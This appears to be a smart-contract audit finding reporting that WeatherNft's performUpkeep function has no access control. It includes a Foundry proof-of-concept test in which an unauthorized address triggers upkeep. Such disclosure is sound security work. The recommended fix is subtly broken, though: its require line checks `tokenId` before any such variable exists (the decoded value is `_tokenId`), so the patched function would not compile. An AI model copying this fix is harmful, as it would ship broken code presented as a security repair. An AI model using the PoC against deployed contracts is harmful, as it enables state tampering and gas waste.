### [H-1] The ```WeatherNft:::performUpkeep``` Function Has Missing Access Control.

**Description:** 
The ```WeatherNft:::performUpkeep``` Function Has Missing Access Control.The ```WeatherNft:::performUpkeep``` should 
Only Be Called By The Chainlink Nodes and owner of Token(NFT) .Anyone Can Call ```performUpkeep``` Function
And can Update The States.The Documentation Says That ```performUpkeep``` Function Should Only be Called By 
ChainLink Keepers For Those Users Who Had registered For Automation.


**Impact:** 
Due To Missing Access Control In ```WeatherNft:::performUpkeep``` Function.Any  Malicious User/Attacker  Can Call the Function repeatedly and can update The malicious States and leads to unnecessary gas usage.

**Proof of Concept:**
<details>

```javascript

    function testAnyOneCanCallPerformUpKeepp() public {
        string memory pincode = "125001";
        string memory isoCode = "IN";
        bool registerKeeper = true;
        uint256 heartbeat = 12 hours;
        uint256 initLinkDeposit = 5e18;
        uint256 tokenId = weatherNft.s_tokenCounter();

        vm.startPrank(user);
        linkToken.approve(address(weatherNft), initLinkDeposit);

        bytes32 reqid = weatherNft.requestMintWeatherNFT{
            value: weatherNft.s_currentMintPrice()
        }(pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit);
        vm.stopPrank();

        bytes memory weatherResponse = abi.encode(
            WeatherNftStore.Weather.RAINY
        );
        weatherNft.handleOracleFulfillment(reqid, weatherResponse, "");

        vm.prank(user);
        weatherNft.fulfillMintRequest(reqid);

        vm.prank(user);
        string memory tokenURI = weatherNft.tokenURI(tokenId);

        bytes memory encodedTokenId = abi.encode(tokenId);
        vm.warp(block.timestamp + 12 hours);

        (bool weatherUpdateNeeded, bytes memory performdata) = weatherNft
            .checkUpkeep(encodedTokenId);
        vm.prank(malicioussuser);
        weatherNft.performUpkeep(performdata);
        /*
        Ran 1 test for test/WeatherNftForkTest.t.sol:WeatherNftForkTest
        [PASS] testAnyOneCanCallPerformUpKeepp() (gas: 1130725)
        Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.98ms (2.08ms CPU time)
        Ran 1 test suite in 12.55ms (5.98ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
*/
    }

```
</details>

**Recommended Mitigation:**  
For Automatation Registered User,We Wil Use s_keeperRegistry To stop Access From Unauthorized Users

For Manual Users,We Will User Ownerof Token(NFT).

```diff
+require(s_keeperRegistry == msg.sender || ownerOf(tokenId) == msg.sender,"NotAuthorized");
```
Full Code :

<details>

```javascript

 function performUpkeep(bytes calldata performData) external override {
//access control
        require(
            s_keeperRegistry == msg.sender || ownerOf(tokenId) == msg.sender,
            "NotAuthorized"
        );
        uint256 _tokenId = abi.decode(performData, (uint256));
   
        uint256 upkeepId = s_weatherNftInfo[_tokenId].upkeepId;

        s_weatherNftInfo[_tokenId].lastFulfilledAt = block.timestamp;

    
        string memory pincode = s_weatherNftInfo[_tokenId].pincode;
        string memory isoCode = s_weatherNftInfo[_tokenId].isoCode;

        bytes32 _reqId = _sendFunctionsWeatherFetchRequest(pincode, isoCode);
        s_funcReqIdToTokenIdUpdate[_reqId] = _tokenId;

        emit NftWeatherUpdateRequestSend(_tokenId, _reqId, upkeepId);
    }
    

```
</details>
